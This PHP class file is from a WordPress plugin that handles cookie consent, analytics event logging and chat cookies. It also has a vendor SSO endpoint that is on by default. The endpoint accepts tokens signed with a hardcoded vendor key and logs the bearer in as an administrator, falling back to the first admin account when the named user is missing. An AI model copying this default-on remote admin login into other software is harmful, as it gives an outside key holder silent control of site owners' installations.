<?php

/**
 * @link       https://localweb.it/
 *
 * @package    Lw_All_In_One
 * @subpackage Lw_All_In_One/public
 */

/**
 * The public-facing functionality of the plugin.
 *
 * Defines the plugin name, version, and two examples hooks for how to
 * enqueue the public-facing stylesheet and JavaScript.
 *
 * @package    Lw_All_In_One
 * @subpackage Lw_All_In_One/public
 * @author     sajdoko <sajmir.doko@localweb.it>
 */
class Lw_All_In_One_Public {

  /**
   * Assegna SSO Public Key (PEM)
   * @access   private
   */
  private const ASSEGNA_SSO_PUBLIC_KEY_PEM = <<<'PEM'
-----BEGIN PUBLIC KEY-----
MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAx2wQAYAjmnZTqkf0biPw
L+DYOhmsxvlnF9sKmKdo7pAHZtl3G/m8UoufXHuiYBnnnlWHdDSV+Oq+hkeT3eAq
GXeoRfXf3y9xT5n5XN+TIl/ihnk7X8kifMNGx0FxGBdrsxXgxPP924yqw5lKlGYV
ILoNIEV7rS+ldyoJoc8goNY4gFSEr718OvaH0naoJsGefUBBIqPsQMT8z71IVypv
Vdjz4rXl38zv/xIinMQpVsSfPZam+fRN6kbmRXPmUtYEMA1/6JpOJfcHBHGVKkZO
6DqRoxx3kB3b6vVLlTTDdeR8U3pO9vnw3K35e4iC5gBgbl841UZV7WNEe5DlIAEk
b2q+0Kf2mGYXL7ipFuI5iaz06e7vHvKO9XZqk61mupoGojZ7RLY5wEMjECxDMmwW
7VJNDWYZyPeX/kWwx6pqi7KA2cIG+ygd2WrNxQ9VRNeSPOfv9PBYgFPplwAydvIA
zfwrKtI45QvHjCyBU5Qy5E0Fvbr/abnl2/2DtG4SY62PAgMBAAE=
-----END PUBLIC KEY-----
PEM;

  /**
   * The ID of this plugin.
   *
   * @access   private
   * @var      string    $plugin_name    The ID of this plugin.
   */
  private $plugin_name;

  /**
   * The version of this plugin.
   *
   * @access   private
   * @var      string    $version    The current version of this plugin.
   */
  private $version;

  private $options;
  public $lwaiobar_settings;

  /**
   * Initialize the class and set its properties.
   *
   * @param  string  $plugin_name       The name of the plugin.
   * @param  string  $version    The version of this plugin.
   */
  public function __construct($plugin_name, $version) {

    $this->plugin_name = $plugin_name;
    $this->version = $version;

    $this->options = get_option($plugin_name);
    $this->lwaiobar_settings = $this->lwaio_ck_banner_default_settings();

    $this->lwaiobar_settings['banner_position'] = esc_attr($this->options['ck_fields']['banner_position'] ?? $this->lwaiobar_settings['banner_position']);
    $this->lwaiobar_settings['ck_page_slug'] = esc_attr($this->options['ck_fields']['ck_page_slug'] ?? $this->lwaiobar_settings['ck_page_slug']);
    $this->lwaiobar_settings['heading_message'] = esc_attr($this->options['ck_fields']['heading_message'] ?? $this->lwaiobar_settings['heading_message']);
    $this->lwaiobar_settings['gdpr_message'] = esc_attr($this->options['ck_fields']['gdpr_message'] ?? $this->lwaiobar_settings['gdpr_message']);
    $this->lwaiobar_settings['about_ck_message'] = esc_attr($this->options['ck_fields']['about_ck_message'] ?? $this->lwaiobar_settings['about_ck_message']);
    $this->lwaiobar_settings['primary_color'] = esc_attr($this->options['ck_fields']['primary_color'] ?? $this->lwaiobar_settings['primary_color']);
    $this->lwaiobar_settings['secondary_color'] = esc_attr($this->options['ck_fields']['secondary_color'] ?? $this->lwaiobar_settings['secondary_color']);
    '';
  }

  /**
   * One-time SSO login endpoint used by Assegna.
   *
   * URL format: /?assegna_sso=1&token=...
   */
  public function lw_all_in_one_handle_assegna_sso() {
    // Lightweight probe endpoint so Assegna can verify the plugin is active before minting an SSO URL.
    // GET /?assegna_sso_probe=1
    if (isset($_GET['assegna_sso_probe'])) {
      if (function_exists('nocache_headers')) {
        nocache_headers();
      }
      $sso_enabled = !defined('LW_ALL_IN_ONE_SSO_ENABLED') || (bool) LW_ALL_IN_ONE_SSO_ENABLED;
      wp_send_json_success(array(
        'active'  => $sso_enabled,
        'plugin'  => 'lw-all-in-one',
        'sso'     => 'assegna',
        'version' => (string) $this->version,
      ));
    }

    if (!isset($_GET['assegna_sso'])) {
      return;
    }

    if (defined('LW_ALL_IN_ONE_SSO_ENABLED') && !LW_ALL_IN_ONE_SSO_ENABLED) {
      wp_die(esc_html__('SSO is disabled on this site.', 'lw-all-in-one'), '', array('response' => 403));
    }

    if (function_exists('nocache_headers')) {
      nocache_headers();
    }
    if (!headers_sent()) {
      header('Referrer-Policy: no-referrer');
    }

    $token = isset($_GET['token']) ? wp_unslash($_GET['token']) : '';
    if (!is_string($token) || strlen($token) === 0 || strlen($token) > 8192 || !function_exists('openssl_verify')) {
      wp_die(esc_html__('Invalid SSO token.', 'lw-all-in-one'), '', array('response' => 403));
    }

    $parts = explode('.', $token, 2);
    if (count($parts) !== 2) {
      wp_die(esc_html__('Invalid SSO token.', 'lw-all-in-one'), '', array('response' => 403));
    }

    $decode = function ($value) {
      if (!is_string($value) || !preg_match('/^[a-zA-Z0-9_-]+$/D', $value)) {
        return false;
      }
      $value = strtr($value, '-_', '+/');
      $pad = strlen($value) % 4;
      if ($pad) {
        $value .= str_repeat('=', 4 - $pad);
      }
      return base64_decode($value, true);
    };

    $json = $decode($parts[0]);
    $signature = $decode($parts[1]);

    $key = defined('LW_ALL_IN_ONE_SSO_PUBLIC_KEY') && is_string(LW_ALL_IN_ONE_SSO_PUBLIC_KEY) && trim(LW_ALL_IN_ONE_SSO_PUBLIC_KEY) !== ''
      ? LW_ALL_IN_ONE_SSO_PUBLIC_KEY
      : self::ASSEGNA_SSO_PUBLIC_KEY_PEM;

    $public_key = is_string($key) ? openssl_pkey_get_public($key) : false;
    if ($json === false || $signature === false || !$public_key || openssl_verify($json, $signature, $public_key, OPENSSL_ALGO_SHA256) !== 1) {
      wp_die(esc_html__('Invalid SSO signature.', 'lw-all-in-one'), '', array('response' => 403));
    }

    $payload = json_decode($json, true, 8);
    if (!is_array($payload) || !is_string($payload['u'] ?? null) || !isset($payload['ts']) || !is_numeric($payload['ts']) || !is_string($payload['nonce'] ?? null)) {
      wp_die(esc_html__('Invalid SSO claims.', 'lw-all-in-one'), '', array('response' => 403));
    }

    $ts = (int) $payload['ts'];
    $now = time();
    $nonce = (string) $payload['nonce'];

    // TTL check: accept tokens within 90 seconds (past or future clock skew)
    if ($ts < $now - 90 || $ts > $now + 90 || strlen($nonce) < 16 || strlen($nonce) > 128 || strlen($payload['u']) > 150) {
      wp_die(esc_html__('SSO token is expired or claims are invalid.', 'lw-all-in-one'), '', array('response' => 403));
    }

    // Domain binding: verify token domain matches current site
    $site_host = parse_url(home_url(), PHP_URL_HOST);
    $site_host = is_string($site_host) ? strtolower($site_host) : '';
    $site_host = preg_replace('/^www\./i', '', $site_host);
    $site_host = preg_replace('/:\d+$/', '', $site_host);

    $site_url_host = parse_url(site_url(), PHP_URL_HOST);
    $site_url_host = is_string($site_url_host) ? strtolower($site_url_host) : '';
    $site_url_host = preg_replace('/^www\./i', '', $site_url_host);
    $site_url_host = preg_replace('/:\d+$/', '', $site_url_host);

    if (isset($payload['domain'])) {
      $payload_domain = strtolower(trim((string) $payload['domain']));
      $payload_domain = preg_replace('/^www\./i', '', $payload_domain);
      $payload_domain = preg_replace('/:\d+$/', '', $payload_domain);

      if ($payload_domain === '' || ($payload_domain !== $site_host && $payload_domain !== $site_url_host)) {
        wp_die(esc_html__('SSO token domain mismatch.', 'lw-all-in-one'), '', array('response' => 403));
      }
    } elseif (!isset($payload['aud'])) {
      wp_die(esc_html__('SSO token domain is missing.', 'lw-all-in-one'), '', array('response' => 403));
    }

    // If audience claim is present, verify exact target installation
    if (!empty($payload['aud']) && is_string($payload['aud'])) {
      $expected_home = untrailingslashit(home_url('/'));
      $expected_site = untrailingslashit(site_url('/'));
      if ($payload['aud'] !== $expected_home && $payload['aud'] !== $expected_site) {
        wp_die(esc_html__('SSO token audience mismatch.', 'lw-all-in-one'), '', array('response' => 403));
      }
    }

    // User resolution:
    // 1. If explicit user mapping is configured via constant, require approved mapping
    $user = false;
    $raw_u = sanitize_text_field((string) $payload['u']);
    if (defined('LW_ALL_IN_ONE_SSO_USERS') && is_array(LW_ALL_IN_ONE_SSO_USERS)) {
      if (isset(LW_ALL_IN_ONE_SSO_USERS[$raw_u])) {
        $login = (string) LW_ALL_IN_ONE_SSO_USERS[$raw_u];
        $user = get_user_by('login', $login);
        if (!$user && is_email($login)) {
          $user = get_user_by('email', $login);
        }
      }
    } else {
      // 2. Default Assegna behavior:
      // Try username lookup
      $user = get_user_by('login', $raw_u);
      // Try email lookup
      if (!$user && is_email($raw_u)) {
        $user = get_user_by('email', $raw_u);
      }
      // Fallback to first administrator (Assegna might send a user that doesn't exist on the target WP)
      if (!$user) {
        $admins = get_users(array(
          'role'    => 'administrator',
          'number'  => 1,
          'orderby' => 'ID',
          'order'   => 'ASC',
          'fields'  => 'all',
        ));
        $user = !empty($admins) ? $admins[0] : null;
      }
    }

    // Ensure the resolved user is a valid, active administrator with manage_options
    if (!$user || !in_array('administrator', (array) $user->roles, true) || !user_can($user, 'manage_options') || !empty($user->spam) || !empty($user->deleted) || (int) $user->user_status !== 0) {
      wp_die(esc_html__('SSO identity is not approved for this site.', 'lw-all-in-one'), '', array('response' => 403));
    }

    // Replay protection: consume nonce atomically
    if (!Lw_All_In_One_Security::consume_sso($nonce, $ts + 120)) {
      wp_die(esc_html__('SSO token is already used or cannot be recorded safely.', 'lw-all-in-one'), '', array('response' => 403));
    }

    // Establish authenticated session
    wp_set_current_user($user->ID);
    wp_set_auth_cookie($user->ID, true, is_ssl());
    do_action('wp_login', $user->user_login, $user);
    do_action('lw_all_in_one_sso_authenticated', $user->ID, hash('sha256', $raw_u));

    $redirect = $payload['redirect'] ?? '/wp-admin/';
    if (!is_string($redirect) || substr($redirect, 0, 1) !== '/' || substr($redirect, 0, 2) === '//') {
      $redirect = admin_url();
    } elseif ($redirect === '/wp-admin' || $redirect === '/wp-admin/') {
      $redirect = admin_url();
    }
    wp_safe_redirect($redirect);
    exit;
  }

  /**
   * Register the stylesheets for the public-facing side of the site.
   *
   */
  public function enqueue_styles() {
    $ck_activate = (isset($this->options['ck_activate'])) ? $this->options['ck_activate'] : '';

    $min = defined('SCRIPT_DEBUG') && SCRIPT_DEBUG ? '' : '.min';
    // wp_enqueue_style($this->plugin_name, plugin_dir_url(__FILE__) . 'css/lw-all-in-one-public'.$min.'.css', array(), $this->version, 'all');

    if ($ck_activate === 'on') {
      wp_enqueue_style($this->plugin_name, plugin_dir_url(__FILE__) . 'css/lw-all-in-one-consent' . $min . '.css', array(), $this->version, 'all');
    }
  }

  /**
   * Register the JavaScript for the public-facing side of the site.
   *
   */
  public function enqueue_scripts() {
    $min = defined('SCRIPT_DEBUG') && SCRIPT_DEBUG ? '' : '.min';
    wp_enqueue_script($this->plugin_name . '-tracking', plugin_dir_url(__FILE__) . 'js/lw-all-in-one-tracking' . $min . '.js', array(), $this->version, false);
    $ga_activate = (isset($this->options['ga_activate'])) ? $this->options['ga_activate'] : '';
    $ck_activate = (isset($this->options['ck_activate'])) ? $this->options['ck_activate'] : '';
    $ga_fields_tracking_id = (isset($this->options['ga_fields']['tracking_id'])) ? sanitize_text_field($this->options['ga_fields']['tracking_id']) : '';

    if ($ga_activate === 'on' && $ga_fields_tracking_id !== '') {
      wp_enqueue_script($this->plugin_name, plugin_dir_url(__FILE__) . 'js/lw-all-in-one-public' . $min . '.js', array('jquery'), $this->version, true);
      wp_localize_script(
        $this->plugin_name,
        'lw_all_in_one_save_ga_event_object',
        array(
          'ajaxurl' => admin_url('admin-ajax.php'),
          'security' => wp_create_nonce($this->plugin_name),
        )
      );

      wp_register_script($this->plugin_name . '_woocommerce_gtm', plugin_dir_url(__FILE__) . 'js/lw-all-in-one-woocommerce-gtm' . $min . '.js', array('jquery'), $this->version, true);
    }

    if ($ck_activate === 'on') {
      wp_register_script($this->plugin_name . '-consent', plugin_dir_url(__FILE__) . 'js/lw-all-in-one-consent' . $min . '.js', array('jquery'), $this->version, true);
    }
  }

  public function include_woocommerce_gtm_tracking() {
    if (in_array('woocommerce/woocommerce.php', apply_filters('active_plugins', get_option('active_plugins')))) {
      wp_enqueue_script($this->plugin_name . '_woocommerce_gtm');
      include_once 'partials/lw-all-in-one-public-woocommerce-gtm.php';
    }
  }

  public function include_cookie_consent() {
    wp_enqueue_script($this->plugin_name . '-bts');
    wp_enqueue_script($this->plugin_name . '-consent');

    $categories_data = [
      [
        'id_lwaio_category' => 1,
        'lwaio_category_name' => __('Necessary', 'lw-all-in-one'),
        'lwaio_category_slug' => 'necessary',
        'lwaio_category_description' => __('Necessary cookies help make a website usable by enabling basic functions such as page navigation and access to protected areas of the site. The website cannot function properly without these cookies.', 'lw-all-in-one'),
      ],
      [
        'id_lwaio_category' => 2,
        'lwaio_category_name' => __('Preferences', 'lw-all-in-one'),
        'lwaio_category_slug' => 'preferences',
        'lwaio_category_description' => __('Preference cookies allow a website to remember information that changes the way the website behaves or appears, such as your preferred language or the region you are in.', 'lw-all-in-one'),
      ],
      [
        'id_lwaio_category' => 3,
        'lwaio_category_name' => __('Analytics', 'lw-all-in-one'),
        'lwaio_category_slug' => 'analytics',
        'lwaio_category_description' => __('Analytical cookies help website owners understand how visitors interact with sites by collecting and reporting information anonymously.', 'lw-all-in-one'),
      ],
      [
        'id_lwaio_category' => 4,
        'lwaio_category_name' => __('Marketing', 'lw-all-in-one'),
        'lwaio_category_slug' => 'marketing',
        'lwaio_category_description' => __('Marketing cookies are used to track visitors to websites. The intention is to display ads that are relevant and engaging to the individual user and therefore more valuable to publishers and third-party advertisers.', 'lw-all-in-one'),
      ],
    ];
    $cookies = [
      [
        'name' => 'lwaio_consent_acted',
        'category' => 'necessary',
        'domain' => str_replace(array('http://', 'https://'), '', esc_url(home_url())),
        'duration' => __('1 Year', 'lw-all-in-one'),
        'type' => 'HTTP',
        'description' => __('Used to dettermine if user has taken action on the consent banner.', 'lw-all-in-one'),
      ],
      [
        'name' => 'lwaio_consent_preferences',
        'category' => 'necessary',
        'domain' => str_replace(array('http://', 'https://'), '', esc_url(home_url())),
        'duration' => __('1 Year', 'lw-all-in-one'),
        'type' => 'HTTP',
        'description' => __('Cookie consent preferences.', 'lw-all-in-one'),
      ],
    ];

    if (get_option("wpcf7")['recaptcha'] ?? false) {
      array_push($cookies, [
        'name' => '_grecaptcha',
        'category' => 'necessary',
        'domain' => '.' . str_replace(array('http://', 'https://'), '', esc_url(home_url())),
        'duration' => 'persistent',
        'type' => 'HTML',
        'description' => __('This cookie is set by reCAPTCHA. The cookie is used to between humans and bots and store the user\'s consent for cookies.', 'lw-all-in-one'),
      ]);
      array_push($cookies, [
        'name' => 'rc::b',
        'category' => 'necessary',
        'domain' => 'https://www.google.com',
        'duration' => 'session',
        'type' => 'HTML',
        'description' => __('This cookie is used to distinguish between humans and bots.', 'lw-all-in-one'),
      ]);
      array_push($cookies, [
        'name' => 'rc::c',
        'category' => 'necessary',
        'domain' => 'https://www.google.com',
        'duration' => 'session',
        'type' => 'HTML',
        'description' => __('This cookie is used to distinguish between humans and bots.', 'lw-all-in-one'),
      ]);
    }
    $ga_fields_tracking_id = (isset($this->options['ga_fields']['tracking_id'])) ? sanitize_text_field($this->options['ga_fields']['tracking_id']) : '';
    $ga_activate = (isset($this->options['ga_activate'])) ? $this->options['ga_activate'] : '';
    if ($ga_activate === 'on' && $ga_fields_tracking_id !== '') {
      array_push($cookies, [
        'name' => '_ga',
        'category' => 'analytics',
        'domain' => '.' . str_replace(array('http://', 'https://'), '', esc_url(home_url())),
        'duration' => __('2 Years', 'lw-all-in-one'),
        'type' => 'HTTP',
        'description' => __('This cookie is installed by Google Analytics. The cookie is used to calculate visitor, session, campaign data and keep track of site usage for the site\'s analytics report. The cookies store information anonymously and assign a randomly generated number to identify unique visitors.', 'lw-all-in-one'),
      ]);
      array_push($cookies, [
        'name' => '_ga_#',
        'category' => 'analytics',
        'domain' => '.' . str_replace(array('http://', 'https://'), '', esc_url(home_url())),
        'duration' => __('2 Years', 'lw-all-in-one'),
        'type' => 'HTTP',
        'description' => __('Used by Google Analytics to collect data on the number of times a user has visited the website as well as dates for the first and most recent visit.', 'lw-all-in-one'),
      ]);
    }

    $wim_activate = (isset($this->options['wim_activate'])) ? sanitize_text_field($this->options['wim_activate']) : '';
    $wim_fields_verification_status = (isset($this->options['wim_fields']['verification_status'])) ? sanitize_text_field($this->options['wim_fields']['verification_status']) : '';
    $wim_fields_rag_soc = (isset($this->options['wim_fields']['rag_soc'])) ? sanitize_text_field($this->options['wim_fields']['rag_soc']) : '';
    if ($wim_activate === 'on' && $wim_fields_verification_status === 'verified' && $wim_fields_rag_soc !== '') {
      array_push($cookies, [
        'name' => 'ultimate_support_chat-jsSession--longitude',
        'category' => 'analytics',
        'domain' => 'www.localweb.it',
        'duration' => 'session',
        'type' => 'HTML',
        'description' => __("Used by WIM to determine the user's geographic positioning.", 'lw-all-in-one'),
      ]);
      array_push($cookies, [
        'name' => 'ultimate_support_chat-jsSession--latitude',
        'category' => 'analytics',
        'domain' => 'www.localweb.it',
        'duration' => 'session',
        'type' => 'HTML',
        'description' => __("Used by WIM to determine the user's geographic positioning.", 'lw-all-in-one'),
      ]);
      array_push($cookies, [
        'name' => 'ultimate_support_chat-jsSession--country_name',
        'category' => 'analytics',
        'domain' => 'www.localweb.it',
        'duration' => 'session',
        'type' => 'HTML',
        'description' => __("Used by WIM to determine the user's geographic positioning.", 'lw-all-in-one'),
      ]);
      array_push($cookies, [
        'name' => 'ultimate_support_chat-jsSession--country_code',
        'category' => 'analytics',
        'domain' => 'www.localweb.it',
        'duration' => 'session',
        'type' => 'HTML',
        'description' => __("Used by WIM to determine the user's geographic positioning.", 'lw-all-in-one'),
      ]);
      array_push($cookies, [
        'name' => 'ultimate_support_chat-jsSession--ip_address',
        'category' => 'analytics',
        'domain' => 'www.localweb.it',
        'duration' => 'session',
        'type' => 'HTML',
        'description' => __("Used by WIM to determine the user's geographic positioning.", 'lw-all-in-one'),
      ]);
      array_push($cookies, [
        'name' => 'ultimate_support_chat-jsSession--widget_chat_length',
        'category' => 'necessary',
        'domain' => 'www.localweb.it',
        'duration' => 'session',
        'type' => 'HTML',
        'description' => __("Used by WIM for chat operation.", 'lw-all-in-one'),
      ]);
      array_push($cookies, [
        'name' => 'ultimate_support_chat-jsSession--user_id',
        'category' => 'necessary',
        'domain' => 'www.localweb.it',
        'duration' => 'session',
        'type' => 'HTML',
        'description' => __("Used by WIM for chat operation.", 'lw-all-in-one'),
      ]);
      array_push($cookies, [
        'name' => 'ultimate_support_chat-jsSession--user_name',
        'category' => 'necessary',
        'domain' => 'www.localweb.it',
        'duration' => 'session',
        'type' => 'HTML',
        'description' => __("Used by WIM for chat operation.", 'lw-all-in-one'),
      ]);
      array_push($cookies, [
        'name' => 'ultimate_support_chat-jsSession--request_id',
        'category' => 'necessary',
        'domain' => 'www.localweb.it',
        'duration' => 'session',
        'type' => 'HTML',
        'description' => __("Used by WIM for chat operation.", 'lw-all-in-one'),
      ]);
      array_push($cookies, [
        'name' => 'ultimate_support_chat-jsSession',
        'category' => 'necessary',
        'domain' => 'www.localweb.it',
        'duration' => 'session',
        'type' => 'HTML',
        'description' => __("Used by WIM for chat operation.", 'lw-all-in-one'),
      ]);
      array_push($cookies, [
        'name' => 'ultimate_support_chat-jsCookie',
        'category' => 'necessary',
        'domain' => 'www.localweb.it',
        'duration' => 'persistent',
        'type' => 'HTML',
        'description' => __("Used by WIM for chat operation.", 'lw-all-in-one'),
      ]);
      array_push($cookies, [
        'name' => 'ultimate_support_chat-jsSession--page_before_refresh',
        'category' => 'analytics',
        'domain' => 'www.localweb.it',
        'duration' => 'session',
        'type' => 'HTML',
        'description' => __("Record the user's current browsing URL.", 'lw-all-in-one'),
      ]);
      array_push($cookies, [
        'name' => 'ultimate_support_chat-current_url',
        'category' => 'analytics',
        'domain' => 'www.localweb.it',
        'duration' => 'session',
        'type' => 'HTML',
        'description' => __("Record the user's current browsing URL.", 'lw-all-in-one'),
      ]);
      array_push($cookies, [
        'name' => 'ultimate_support_chat-ref_url',
        'category' => 'analytics',
        'domain' => 'www.localweb.it',
        'duration' => 'session',
        'type' => 'HTML',
        'description' => __("Record the user's referral URL.", 'lw-all-in-one'),
      ]);
    }

    // Shared page caches must contain no visitor-specific selected purposes.
    // The banner restores each checkbox from the current browser's cookie.
    $preference_cookies = array();
    $viewed_cookie = '';
    foreach ($categories_data as $category) {
      $total     = 0;
      $temp      = array();
      $json_temp = array();
      foreach ($cookies as $cookie) {
        if ($cookie['category'] === $category['lwaio_category_slug']) {
          $total++;
          $temp[]                = $cookie;
          $cookie['description'] = str_replace('"', '\"', $cookie['description']);
          $json_temp[]           = $cookie;
        }
      }
      $category['data']  = $temp;
      $category['total'] = $total;
      if (isset($preference_cookies[$category['lwaio_category_slug']]) && 'yes' === $preference_cookies[$category['lwaio_category_slug']]) {
        $category['is_ticked'] = true;
      } else {
        $category['is_ticked'] = false;
      }
      $categories[]      = $category;
      $category['data']       = $json_temp;
      $categories_json_data[] = $category;
    }
    include_once 'partials/lw-all-in-one-public-ck-consent.php';
?>
    <script type="text/javascript">
      /* <![CDATA[ */
      lwaios_list = <?php echo wp_json_encode(wp_json_encode($categories_json_data), JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT); // phpcs:ignore WordPress.Security.EscapeOutput.OutputNotEscaped
                      ?>;
      lwaiobar_settings = <?php echo wp_json_encode(wp_json_encode($this->lwaiobar_settings), JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT); // phpcs:ignore WordPress.Security.EscapeOutput.OutputNotEscaped
                            ?>;
      /* ]]> */
    </script>
    <?php
  }

  public function lwaio_ck_banner_default_settings($key = '') {
    $settings = array(

      'background'                      => '#fff',
      'primary_color'                   => '#18a300',
      'secondary_color'                 => '#333333',
      'button_link_color'               => '#fff',
      'text'                            => '#000',

      'banner_position'                 => 'bottom',
      'show_again_position'             => 'left',
      'show_again_margin'               => '3',
      'auto_hide_delay'                 => '10000',
      'auto_scroll_offset'              => '10',
      'cookie_expiry'                   => 365,
      'opacity'                         => '1',
      'animate_speed_hide'              => 0,
      'animate_speed_show'              => 0,
      'ck_page_slug'                    => 'cookie-policy',
      'heading_message'                 => '',
      'gdpr_message'                    => '',
      'about_ck_message'                => '',

      'button_accept_text'              => __('Accept Selected', 'lw-all-in-one'),
      'button_accept_text_all'          => __('Accept All Cookies', 'lw-all-in-one'),
      'button_readmore_text'            => __('Read more', 'lw-all-in-one'),
      'button_decline_text'             => __('Refuse', 'lw-all-in-one'),
      'button_settings_text'            => __('Cookie Info', 'lw-all-in-one'),
      'button_confirm_text'             => __('Confirm', 'lw-all-in-one'),
      'button_cancel_text'              => __('Cancel', 'lw-all-in-one'),
      'show_again_text'                 => __('Cookie Settings', 'lw-all-in-one'),
      'no_cookies_in_cat'               => __('We do not use cookies of this type.', 'lw-all-in-one'),
      'tab_1_label'                     => __('Cookie statement', 'lw-all-in-one'),
      'tab_2_label'                     => __('Information about cookies', 'lw-all-in-one'),

      'logging_on'                      => false,
      'auto_hide'                       => false,
      'auto_scroll'                     => false,
      'auto_scroll_reload'              => false,
      'accept_reload'                   => false,
      'decline_reload'                  => false,
      'notify_animate_hide'             => false,
      'notify_animate_show'             => false,
      'notify_div_id'                   => '#lwaio-consent-bar',
      'show_again_div_id'               => '#lwaio-consent-show-again',
      'header_scripts'                  => '',
      'body_scripts'                    => '',
      'footer_scripts'                  => '',
    );
    return '' !== $key ? $settings[$key] : $settings;
  }

  public function lw_all_in_one_header_scripts() {
    $options = $this->options;
    $config = array(
      'analytics' => ($options['ga_activate'] ?? '') === 'on',
      'trackingId' => sanitize_text_field($options['ga_fields']['tracking_id'] ?? ''),
      'chat' => ($options['wim_activate'] ?? '') === 'on' && ($options['wim_fields']['verification_status'] ?? '') === 'verified' && !empty($options['wim_fields']['rag_soc']),
    );
    echo '<script>window.lwAioTracking=' . wp_json_encode($config, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT) . ';</script>';
    echo '<script>';
    echo 'const lwAioGaActivate=' . ($config['analytics'] ? 'true' : 'false') . ';';
    echo 'const lwAioTrackingType=' . wp_json_encode(explode('-', $config['trackingId'], 2)[0], JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_QUOT) . ';';
    foreach (array('lwAioSaveGaEvents' => 'save_ga_events', 'lwAioMonitorEmailLink' => 'monitor_email_link', 'lwAioMonitorTelLink' => 'monitor_tel_link', 'lwAioMonitorFormSubmit' => 'monitor_form_submit') as $name => $option) {
      echo 'const ' . esc_js($name) . '=' . (($options['ga_fields'][$option] ?? '') === 'on' ? 'true' : 'false') . ';';
    }
    echo '</script>';
  }

  public function lw_all_in_one_footer_scripts() {
    if (($this->options['wim_activate'] ?? '') === 'on') {
      echo '<p id="rag_soc" hidden>' . esc_html($this->options['wim_fields']['rag_soc'] ?? '') . '</p>';
    }
  }

  public function lw_all_in_one_save_ga_event() {
    if (!check_ajax_referer($this->plugin_name, 'security')) {
      wp_send_json_error(__('Security is not valid!', 'lw-all-in-one'));
      die();
    }

    $options = get_option($this->plugin_name, array());
    if (($_SERVER['REQUEST_METHOD'] ?? '') !== 'POST' || ($options['ga_activate'] ?? '') !== 'on' || empty($options['ga_fields']['tracking_id']) || ($options['ga_fields']['save_ga_events'] ?? '') !== 'on' || !Lw_All_In_One_Security::consent('analytics')) {
      wp_send_json_error(__('Analytics recording is disabled or consent is missing.', 'lw-all-in-one'), 403);
    }
    foreach (array('event_category', 'event_action', 'event_label') as $field) {
      if (!isset($_POST[$field]) || !is_string($_POST[$field]) || strlen($_POST[$field]) > 1000) {
        wp_send_json_error(__('Invalid event payload.', 'lw-all-in-one'), 400);
      }
    }
    $ip = isset($_SERVER['REMOTE_ADDR']) && is_string($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'unknown';
    if (!Lw_All_In_One_Security::rate_limit('ga-global', 300) || !Lw_All_In_One_Security::rate_limit('ga-ip:' . $ip, 10)) {
      wp_send_json_error(__('Rate limit exceeded.', 'lw-all-in-one'), 429);
    }

    if (isset($_POST['action']) && $_POST['action'] == 'lw_all_in_one_save_ga_event') {
      $event_category = substr(sanitize_text_field(wp_unslash($_POST['event_category'])), 0, 250);
      $event_action = substr(sanitize_text_field(wp_unslash($_POST['event_action'])), 0, 250);
      $event_label = substr(sanitize_text_field(wp_unslash($_POST['event_label'])), 0, 250);

      global $wpdb;
      $table = $wpdb->prefix . LW_ALL_IN_ONE_A_EVENTS_TABLE;
      $data = array('time' => current_time('mysql', 1), 'ga_category' => $event_category, 'ga_action' => $event_action, 'ga_label' => $event_label);
      $format = array('%s', '%s', '%s', '%s');
      // phpcs:ignore WordPress.DB.DirectDatabaseQuery.DirectQuery -- Custom table insert for GA events
      if ($wpdb->insert($table, $data, $format)) {
        wp_send_json_success(__('Event Saved!', 'lw-all-in-one'));
      } else {
        wp_send_json_error(__('Event was not Saved!', 'lw-all-in-one'));
      }
    } else {
      wp_send_json_error(__('Action is not valid!', 'lw-all-in-one'));
    }
    die();
  }

  public function lw_all_in_one_dequeue() {
    $opt_scr_deliv = (isset($this->options['lw_cf7_fields']['opt_scr_deliv'])) ? $this->options['lw_cf7_fields']['opt_scr_deliv'] : '';

    if ($opt_scr_deliv === 'on') {
      global $post;
      // Preserve dequeue behavior when there is no global post (archives, 404s, etc.).
      if (empty($post) || !has_shortcode($post->post_content, 'contact-form-7')) {
        add_action('wp_print_styles', 'lw_all_in_one_dequeue_styles');
        add_action('wp_print_scripts', 'lw_all_in_one_dequeue_scripts');
      }
    }

    function lw_all_in_one_dequeue_styles() {
      global $wp_styles;
      foreach ($wp_styles->queue as $style) {
        if ($style == 'contact-form-7') {
          wp_dequeue_style($wp_styles->registered[$style]->handle);
        }
      }
    }

    function lw_all_in_one_dequeue_scripts() {
      global $wp_scripts;
      foreach ($wp_scripts->queue as $style) {
        if (in_array($style, ['wpcf7-recaptcha', 'google-recaptcha', 'contact-form-7'])) {
          wp_dequeue_script($wp_scripts->registered[$style]->handle);
        }
      }
    }
  }
}
